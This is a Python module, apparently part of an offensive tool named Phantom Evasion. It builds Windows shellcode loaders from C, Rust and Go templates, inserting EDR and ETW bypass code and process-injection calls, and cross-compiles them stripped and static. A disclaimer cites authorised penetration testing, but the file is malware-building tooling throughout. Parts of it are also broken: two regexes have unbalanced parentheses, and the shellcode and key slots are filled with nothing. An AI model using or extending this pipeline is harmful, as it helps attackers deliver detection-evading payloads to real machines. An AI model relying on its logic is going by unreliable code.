"""
Phantom Evasion - Compiler

LEGAL DISCLAIMER:
For authorized penetration testing and security research ONLY.
Users must have explicit written permission from the target system owner.
"""

import os
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, Any, Optional, List


class Compiler:
    """Compile obfuscated loader templates using the appropriate toolchain."""

    # Compilation flags for C (MinGW cross-compiler)
    _C_FLAGS = [
        "-mwindows",
        "-O2",
        "-s",
        "-static",
        "-lntdll",
        "-lbcrypt",
        "-lkernel32",
        "-luser32",
    ]

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def compile_c(
        self,
        template: str,
        output_path: str,
        obfuscated_code: Dict[str, Any],
    ) -> bool:
        compiler_bin = self._find_c_compiler()
        if compiler_bin is None:
            return False

        source = self._fill_c_template(template, obfuscated_code)

        with tempfile.NamedTemporaryFile(suffix='.c', delete=False, mode='w', encoding='utf-8') as tmp:
            tmp.write(source)
            tmp_path = tmp.name

        try:
            cmd = [compiler_bin, tmp_path, "-o", output_path] + self._C_FLAGS
            self._run(cmd)
        finally:
            os.unlink(tmp_path)

        return True

    def compile_rust(
        self,
        template: str,
        output_path: str,
        obfuscated_code: Dict[str, Any],
    ) -> bool:
        compiler_bin = self._find_tool("rustc")
        if compiler_bin is None:
            return False

        source = self._fill_rust_template(template, obfuscated_code)

        with tempfile.NamedTemporaryFile(suffix='.rs', delete=False, mode='w', encoding='utf-8') as tmp:
            tmp.write(source)
            tmp_path = tmp.name

        try:
            cmd = [
                compiler_bin,
                tmp_path,
                "-o", output_path,
                "--target", "x86_64-pc-windows-gnu",
                "-C", "opt-level=2",
                "-C", "strip=symbols",
            ]
            self._run(cmd)
        finally:
            os.unlink(tmp_path)

        return True

    def compile_go(
        self,
        template: str,
        output_path: str,
        obfuscated_code: Dict[str, Any],
    ) -> bool:
        compiler_bin = self._find_tool("go")
        if compiler_bin is None:
            return False

        source = self._fill_go_template(template, obfuscated_code)

        with tempfile.TemporaryDirectory() as tmp_dir:
            src_file = os.path.join(tmp_dir, "main.go")
            with open(src_file, "w", encoding="utf-8") as f:
                f.write(source)

            env = os.environ.copy()
            env.update({"GOOS": "windows", "GOARCH": "amd64", "CGO_ENABLED": "0"})
            cmd = [compiler_bin, "build", "-ldflags", "-s -w", "-o", output_path, src_file]
            self._run(cmd, env=env)

        return True

    # ------------------------------------------------------------------
    # Template filling helpers
    # ------------------------------------------------------------------

    def _fill_c_template(self, template_path: str, code: Dict[str, Any]) -> str:
        """Read the C template, substitute PLACEHOLDERs, and deduplicate."""
        source = self._read_template(template_path)

        injection_code = code.get("injection_code", "")
        main_call = self._extract_entry_call(injection_code)

        substitutions = {
            "/* PLACEHOLDER: decryption_key */": "",
            "/* PLACEHOLDER: encrypted_shellcode */": "",
            "/* PLACEHOLDER: decryption_routine */": code.get("encryption_code", ""),
            "/* PLACEHOLDER: evasion_techniques */": "\n".join(filter(None, [
                code.get("edr_code", ""),
                code.get("etw_code", ""),
                code.get("behavioral_code", ""),
            ])),
            "/* PLACEHOLDER: injection_method */": injection_code,
            "/* PLACEHOLDER: main_code */": main_call,
        }
        for placeholder, replacement in substitutions.items():
            source = source.replace(placeholder, replacement)

        source = self._deduplicate_c_code(source)
        return source

    def _fill_rust_template(self, template_path: str, code: Dict[str, Any]) -> str:
        source = self._read_template(template_path)
        substitutions = {
            "// PLACEHOLDER: shellcode": f"// Shellcode embedded by Phantom Evasion\n// {code.get('description', '')}",
            "// PLACEHOLDER: evasion": f"// EDR bypass: {code.get('edr_code', '')[:80]}",
        }
        for placeholder, replacement in substitutions.items():
            source = source.replace(placeholder, replacement)
        return source

    def _fill_go_template(self, template_path: str, code: Dict[str, Any]) -> str:
        source = self._read_template(template_path)
        substitutions = {
            "// PLACEHOLDER: shellcode": f"// Shellcode embedded by Phantom Evasion\n// {code.get('description', '')}",
            "// PLACEHOLDER: evasion": f"// EDR bypass: {code.get('edr_code', '')[:80]}",
        }
        for placeholder, replacement in substitutions.items():
            source = source.replace(placeholder, replacement)
        return source

    # ------------------------------------------------------------------
    # C code deduplication engine
    # ------------------------------------------------------------------

    @staticmethod
    def _extract_entry_call(injection_code: str) -> str:
        priority = [
            "classic_inject", "apc_inject", "early_bird_inject",
            "callback_inject", "run_flattened_loader", "run_payload",
        ]
        func_names = re.findall(
            r'(?:static\s+)?(?:BOOL|void|DWORD|int)\s+(\w+)\s*(',
            injection_code
        )
        for name in priority:
            if name in func_names:
                return f"    {name}();"
        if func_names:
            return f"    {func_names[-1]}();"
        return "    /* No injection method configured */"

    @staticmethod
    def _deduplicate_c_code(source: str) -> str:
        lines = source.split('\n')

        seen_directives: set = set()
        includes: List[str] = []
        pragmas: List[str] = []
        other_lines: List[str] = []

        for line in lines:
            stripped = line.strip()
            if stripped.startswith('#include'):
                if stripped not in seen_directives:
                    seen_directives.add(stripped)
                    includes.append(line)
            elif stripped.startswith('#pragma'):
                if stripped not in seen_directives:
                    seen_directives.add(stripped)
                    pragmas.append(line)
            else:
                other_lines.append(line)

        seen_vars: set = set()
        deduped: List[str] = []
        skip_until_semicolon = False

        for line in other_lines:
            stripped = line.strip()

            if skip_until_semicolon:
                if '};' in stripped or stripped.endswith('};'):
                    skip_until_semicolon = False
                continue

            if stripped.startswith('static ') and '=' in stripped:
                before_eq = stripped.split('=')[0].strip()
                if '(' in before_eq:
                    deduped.append(line)
                    continue
                clean = before_eq.rstrip('[]').rstrip()
                parts = clean.split()
                var_name = parts[-1] if parts else ""
                if var_name and var_name in seen_vars:
                    if '{' in stripped and '};' not in stripped:
                        skip_until_semicolon = True
                    continue
                if var_name:
                    seen_vars.add(var_name)

            deduped.append(line)

        seen_funcs: set = set()
        final: List[str] = []
        brace_depth = 0
        skipping_func = False

        for line in deduped:
            stripped = line.strip()

            if skipping_func:
                brace_depth += stripped.count('{') - stripped.count('}')
                if brace_depth <= 0:
                    skipping_func = False
                    brace_depth = 0
                continue

            func_match = re.match(
                r'(?:static\s+)?(?:inline\s+)?'
                r'(?:BOOL|void|DWORD|int|NTSTATUS|HANDLE|LPVOID|SIZE_T|'
                r'unsigned\s+char\s*\*|char\s*\*)\s+\*?(\w+)\s*(',
                stripped
            )
            if func_match:
                func_name = func_match.group(1)
                is_definition = '{' in stripped
                if func_name in seen_funcs and is_definition:
                    brace_depth = stripped.count('{') - stripped.count('}')
                    skipping_func = brace_depth > 0
                    continue
                if is_definition:
                    seen_funcs.add(func_name)

            final.append(line)

        return '\n'.join(includes + [''] + pragmas + [''] + final)

    # ------------------------------------------------------------------
    # Utilities
    # ------------------------------------------------------------------

    @staticmethod
    def _read_template(template_path: str) -> str:
        try:
            with open(template_path, encoding="utf-8") as f:
                return f.read()
        except FileNotFoundError:
            return "/* Template file not found */\n"

    @staticmethod
    def _find_tool(name: str) -> Optional[str]:
        return shutil.which(name)

    @staticmethod
    def _find_c_compiler() -> Optional[str]:
        candidates = [
            "x86_64-w64-mingw32-gcc",
            "gcc",
            "cc",
        ]
        for name in candidates:
            path = shutil.which(name)
            if path is not None:
                return path
        return None

    @staticmethod
    def _run(cmd: list, env: Optional[dict] = None) -> None:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            env=env,
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"Compilation failed (exit {result.returncode}):\n"
                f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
            )
